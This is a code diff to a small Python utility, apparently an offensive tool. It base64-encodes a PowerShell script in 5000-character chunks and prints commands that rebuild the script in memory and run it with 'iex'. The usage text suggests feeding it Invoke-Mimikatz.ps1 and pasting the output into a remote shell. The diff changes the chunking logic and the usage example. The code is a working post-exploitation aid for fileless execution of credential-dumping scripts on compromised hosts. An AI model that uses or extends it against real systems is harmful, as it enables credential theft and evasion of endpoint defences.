@@ -16,7 +16,7 @@ if len(sys.argv) < 2:
 	print("   %s -cmd \"CMD\"\tEncode a single command" % sys.argv[0])
 	print("")
 	print("Full Example:")
-	print("  (local)  python .\\b64xFunc.py -file PowerView.ps1 | clip")
+	print("  (local)  python .\\ps1MemChunk.py -file Invoke-Mimikatz.ps1 | clip")
 	print("  (remote) [Ctrl-V] [Enter]")
 	print("")
 	exit()
@@ -37,30 +37,16 @@ else:
 	print("[!] Unknown parameter")
 	exit()
 
-output = ''
-
 print("$tmpMemChunk = '';")
 
-for line in ps1.splitlines():
+chunkLen = 5000
+chunks = [ps1[i:i+chunkLen] for i in range(0, len(ps1), chunkLen)]
 
-	if line.strip() == '':
-		continue
-
-	output += line + "\n"
-
-	if len(output) > 5000:
-		# print Powershell compatible base64 string
-		encodedOutput = base64.b64encode(bytes(output, 'utf-8')).decode()
-		print("$tmpMemChunk += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\"%s\")));" % encodedOutput)
-		output = ''
-
-# Any remaining output?
-if output != '':
+for chunk in chunks:
 	# print Powershell compatible base64 string
-	encodedOutput = base64.b64encode(bytes(output, 'utf-8')).decode()
+	encodedOutput = base64.b64encode(bytes(chunk, 'utf-8')).decode()
 	print("$tmpMemChunk += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\"%s\")));" % encodedOutput)
-	output = ''
 
 # final command to execute payload
 print("iex $tmpMemChunk;")
-print("# Press enter to execute")
+print("# Done")
